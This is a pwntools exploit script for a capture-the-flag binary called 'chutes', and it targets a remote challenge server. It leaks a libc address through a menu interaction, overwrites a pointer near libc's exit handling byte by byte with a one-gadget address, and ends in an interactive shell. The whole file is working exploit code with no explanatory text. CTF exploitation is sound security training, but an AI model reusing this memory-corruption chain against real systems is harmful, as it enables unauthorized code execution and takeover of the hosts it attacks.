#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'mc.ax', 31326
binary = './chutes_patched'
brkpts = '''
'''
# b *0x0000555555554000+0x1d19

elf = ELF("chutes_patched")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(": ", str(idx))

if __name__ == "__main__":
    choice(10)
    for i in range(10):
        choice(chr(0))
    sla("(y/n): ", 'y')

    choice('5 4')
    choice('8 7')
    for i in range(1, 4):
        choice('{} {}'.format(i*16, i*15))
    
    choice('2 99')

    # Leak
    for i in range(1, 5):
        choice('{} {}'.format(i*13, i*14))

    choice('n')
    choice(2)
    reu("prize: ")
    libc.address = int(rl().strip(), 16) - libc.symbols['puts']
    log.info("libc @ "+hex(libc.address))
    choice('n')

    for i in range(9):
        choice('n')
        choice('a')
        choice('n')
    
    # 4 -> 5 -> 4
    for i in range(9):
        choice('n')
        choice('a')
        choice('n')

    choice('n')
    choice(4)
    choice('n')

    for i in range(9):
        choice('n')
        choice('a')
        choice('n')
    
    choice('n')
    choice(1)
    choice('n')

    for i in range(9):
        choice('n')
        choice(4)
        choice('n')
    
    # 7 -> 8 -> 7
    choice('n')
    choice(3)
    choice('n')

    for i in range(9):
        choice('n')
        choice('a')
        choice('n')
    
    choice('n')
    choice(1)
    choice('n')
    
    # Corrupt idx 7
    free_hook = libc.symbols['__free_hook'] - 4
    malloc_hook = libc.symbols['__malloc_hook'] - 4
    exit_ptr = libc.address + 0x224f68 - 4
    for i in range(7):
        choice('y')
        choice(chr((exit_ptr >> 8*i) & 0xff))
        choice(3)
        choice('n')
    
    # Move to idx 9
    choice('y')
    choice('\x01')
    choice(5)
    choice('n')

    # Stay in place
    for i in range(2):
        choice('n')
        choice('a')
        choice('n')

    gadget = libc.address + 0xe6c7e
    log.info("gadget @ "+hex(gadget))

    # Set lower 4 bytes (doesnt matter)
    for i in range(4):
        choice('n')
        choice(3)
        choice('n')

    for i in range(3):
        choice('y')
        choice(chr((gadget >> 8*i) & 0xff))
        choice(3)
        choice('n')
    
    choice('y')
    choice(chr((gadget >> 8*3) & 0xff))
    choice(1)
    choice('n')

    choice('y')
    choice(chr((gadget >> 8*4) & 0xff))
    choice(6)
    choice('n')

    choice('y')
    choice(chr((gadget >> 8*5) & 0xff))
    choice(3)
    choice('n')

    choice('n')
    choice(7)

    io.interactive()
